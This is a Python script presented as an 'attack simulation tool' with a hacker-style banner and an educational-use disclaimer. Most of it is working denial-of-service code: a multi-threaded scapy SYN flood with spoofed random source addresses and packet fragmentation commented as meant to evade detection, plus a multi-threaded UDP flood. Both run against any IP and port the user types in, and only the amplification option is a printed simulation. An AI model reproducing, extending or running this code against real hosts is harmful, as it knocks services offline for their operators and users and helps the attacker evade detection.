import os
import sys
import time
import socket
import random
import threading
from scapy.all import IP, TCP, UDP, ICMP, send, fragment

# ANSI Colors for Hacker Theme
GREEN  = "\033[92m"
RED    = "\033[91m"
CYAN   = "\033[96m"
YELLOW = "\033[93m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# Creator name
NAME = "Sujal Lamichhane"

def print_warning():
    """Display a warning message before starting."""
    os.system("clear")
    warning_message = f"""
{RED}{BOLD}
##############################################################################
#  WARNING: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY!                      #
#  THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR ILLEGAL ACTIVITIES.       #
#  USE THIS TOOL ONLY IN A CONTROLLED AND AUTHORIZED ENVIRONMENT.            #
##############################################################################
{RESET}
"""
    print(warning_message)
    time.sleep(3)

def print_kali_dada_banner():
    """Display the KALI DADA banner and website info."""
    os.system("clear")
    banner = f"""
{GREEN}{BOLD}
 /$$   /$$  /$$$$$$  /$$       /$$$$$$       /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ 
| $$  /$$/ /$$__  $$| $$      |_  $$_/      | $$__  $$ /$$__  $$| $$__  $$ /$$__  $$
| $$ /$$/ | $$  \ $$| $$        | $$        | $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$
| $$$$$/  | $$$$$$$$| $$        | $$        | $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$$
| $$  $$  | $$__  $$| $$        | $$        | $$  | $$| $$__  $$| $$  | $$| $$__  $$
| $$\  $$ | $$  | $$| $$        | $$        | $$  | $$| $$  | $$| $$  | $$| $$  | $$
| $$ \  $$| $$  | $$| $$$$$$$$ /$$$$$$      | $$$$$$$/| $$  | $$| $$$$$$$/| $$  | $$
|__/  \__/|__/  |__/|________/|______/      |_______/ |__/  |__/|_______/ |__/  |__/
                                                                                    

               {CYAN}Welcome to KALI DADA's Advanced Cyber Attack Simulation Tool{RESET}
"""
    print(banner)
    print(f"{YELLOW}Created by: {NAME}{RESET}")
    print(f"{CYAN}Website: sujallamichhane.com.np{RESET}")
    print(f"{CYAN}[INFO] Visit: sujallamichhane.com.np for more cybersecurity insights!{RESET}\n")
    time.sleep(1)

def check_root():
    """Ensure the script is run as root."""
    if os.geteuid() != 0:
        print(f"{RED}[!] This script must be run as root (sudo). Exiting...{RESET}")
        sys.exit(1)

def server_status(target_ip):
    """Check if the target server is up by attempting a connection on port 80."""
    try:
        socket.create_connection((target_ip, 80), timeout=2)
        print(f"{GREEN}[+] Server {target_ip} is UP!{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[-] Server {target_ip} is DOWN! Error: {e}{RESET}")
        return False

def advanced_syn_flood(target_ip, target_port, duration, threads=5):
    """Perform an advanced TCP SYN Flood Attack with IP fragmentation and multi-threading."""
    print(f"{YELLOW}[+] Starting Advanced TCP SYN Flood Attack on {target_ip}:{target_port} with {threads} threads{RESET}")
    timeout = time.time() + duration
    packet_count = [0]  # Mutable list for thread-safe counting

    def flood():
        while time.time() < timeout:
            try:
                src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
                src_port = random.randint(49152, 65535)
                seq_num = random.randint(1, 4294967295)
                window_size = random.randint(1024, 65535)
                timestamp_option = int(time.time())

                tcp_options = [
                    ('MSS', 1460),
                    ('Timestamp', (timestamp_option, 0)),
                    ('NOP', None),
                    ('SAckOK', ''),
                ]

                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=src_port,
                    dport=target_port,
                    flags="S",
                    seq=seq_num,
                    window=window_size,
                    options=tcp_options
                )

                # Fragment packet to evade detection
                frags = fragment(packet, fragsize=500)
                for frag in frags:
                    send(frag, verbose=False)
                    packet_count[0] += 1
                    print(f"{CYAN}[PACKETS SENT: {packet_count[0]}]{RESET}", end="\r")
                    time.sleep(random.uniform(0.001, 0.01))
            except Exception as e:
                print(f"{RED}[ERROR] {e}{RESET}")

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print(f"\n{GREEN}[+] Advanced SYN Flood Attack Completed. Packets Sent: {packet_count[0]}{RESET}")

def advanced_udp_flood(target_ip, target_port, duration, threads=5):
    """Perform an advanced UDP Flood Attack with variable packet sizes and multi-threading."""
    print(f"{YELLOW}[+] Starting Advanced UDP Flood Attack on {target_ip}:{target_port} with {threads} threads{RESET}")
    timeout = time.time() + duration
    packet_count = [0]

    def flood():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except Exception as e:
            print(f"{RED}[ERROR] Could not create UDP socket: {e}{RESET}")
            return
        while time.time() < timeout:
            try:
                packet_size = random.randint(64, 1500)
                packet = random._urandom(packet_size)
                sock.sendto(packet, (target_ip, target_port))
                packet_count[0] += 1
                print(f"{CYAN}[PACKETS SENT: {packet_count[0]}]{RESET}", end="\r")
                time.sleep(random.uniform(0.001, 0.01))
            except Exception as e:
                print(f"{RED}[ERROR] {e}{RESET}")

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print(f"\n{GREEN}[+] Advanced UDP Flood Attack Completed. Packets Sent: {packet_count[0]}{RESET}")

def amplification_attack(target_ip, duration, amp_factor=10):
    """Simulate an amplification attack (ethical simulation only)."""
    print(f"{YELLOW}[+] Starting Amplification Attack Simulation on {target_ip} with factor {amp_factor}{RESET}")
    print(f"{RED}[INFO] Real amplification attacks are illegal. This is a simulation only.{RESET}")
    time.sleep(2)
    print(f"{GREEN}[SIMULATION] Sent {amp_factor * 1000} amplified packets to {target_ip}{RESET}")

def select_attack():
    """Prompt user to select the type of attack."""
    while True:
        print(f"{BOLD}{YELLOW}\nSelect Attack Type:{RESET}")
        print("1: Advanced TCP SYN Flood")
        print("2: Advanced UDP Flood")
        print("3: Amplification Attack (Simulation)")
        print("4: Exit")
        try:
            choice = int(input(f"{CYAN}Enter your choice (1-4): {RESET}"))
        except ValueError:
            print(f"{RED}[ERROR] Invalid input. Please enter a number between 1 and 4.{RESET}")
            continue
        
        if choice == 4:
            print(f"{GREEN}Exiting...{RESET}")
            sys.exit(0)
        
        target_ip = input(f"{CYAN}Enter Target IP: {RESET}").strip()
        if choice in [1, 2]:
            try:
                target_port = int(input(f"{CYAN}Enter Target Port: {RESET}").strip())
            except ValueError:
                print(f"{RED}[ERROR] Invalid port number.{RESET}")
                continue
        else:
            target_port = None
        try:
            duration = int(input(f"{CYAN}Enter Duration (seconds): {RESET}").strip())
        except ValueError:
            print(f"{RED}[ERROR] Invalid duration.{RESET}")
            continue
        
        if not server_status(target_ip):
            print(f"{RED}[ERROR] Target server seems down. Check the IP or try again later.{RESET}")
            continue
        
        if choice == 1:
            threads = int(input(f"{CYAN}Enter number of threads (default 5): {RESET}").strip() or 5)
            advanced_syn_flood(target_ip, target_port, duration, threads)
        elif choice == 2:
            threads = int(input(f"{CYAN}Enter number of threads (default 5): {RESET}").strip() or 5)
            advanced_udp_flood(target_ip, target_port, duration, threads)
        elif choice == 3:
            amp_factor = int(input(f"{CYAN}Enter amplification factor (default 10): {RESET}").strip() or 10)
            amplification_attack(target_ip, duration, amp_factor)
        
        continue_choice = input(f"{CYAN}Do you want to perform another attack? (y/n): {RESET}").strip().lower()
        if continue_choice != 'y':
            print(f"{GREEN}Exiting...{RESET}")
            break

def main():
    print_kali_dada_banner()
    check_root()
    select_attack()

if __name__ == "__main__":
    print_warning()
    main()
